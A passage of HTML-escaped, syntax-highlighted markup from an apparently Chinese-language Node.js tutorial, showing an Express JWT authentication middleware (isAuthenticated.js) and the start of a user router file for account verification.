&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;success&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;电子邮件已验证&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;接下来，创建一个中间件函数来认证当前登录的用户。&lt;/p&gt;
&lt;p&gt;在您的后端目录中，创建一个名为middlewares的新文件夹。在middlewares文件夹内，创建一个名为isAuthenticated.js的文件。&lt;/p&gt;
&lt;p&gt;添加以下代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//isAuthenticated.js
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;jwt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;jsonwebtoken&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;catchAsync&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../utils/catchAsync&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../utils/appError&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;User&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../model/userModel&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isAuthenticated&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;catchAsync&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 1. 从cookie或Authorization头检索令牌
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cookies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;token&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cookies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;authorization&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;startsWith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Bearer&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;token&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;authorization&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;您未登录。请登录以访问此资源。&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;mi&#34;&gt;401&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 2. 验证令牌
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;decoded&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;decoded&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;jwt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;verify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;JWT_SECRET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;无效或过期的令牌。请重新登录。&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;401&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 3. 确认用户仍存在于数据库中
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;currentUser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;findById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;decoded&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;currentUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;与此令牌关联的用户不再存在。&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;401&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 4. 将用户信息附加到请求
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;currentUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;currentUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;currentUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isAuthenticated&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;现在，转到您的&lt;code&gt;userRouter.js&lt;/code&gt;文件并添加验证账户功能的路由：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;verifyAccount&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../controller/authController&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
